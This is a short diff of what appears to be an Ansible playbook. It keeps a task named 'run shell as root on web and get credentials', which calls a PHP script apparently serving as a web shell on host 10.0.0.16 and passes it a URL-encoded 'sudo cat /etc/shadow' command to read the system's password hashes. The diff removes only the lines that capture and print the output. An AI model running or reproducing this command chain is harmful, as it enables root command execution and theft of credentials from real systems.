@@ -42,5 +42,3 @@
 
     - name: run shell as root on web and get credentials
       raw: php shellrun.php logs_decoded.txt 10.0.0.16/ 'sudo+cat+%2Fetc%2Fshadow'
-      register: out
-    - debug: var=out.stdout_lines
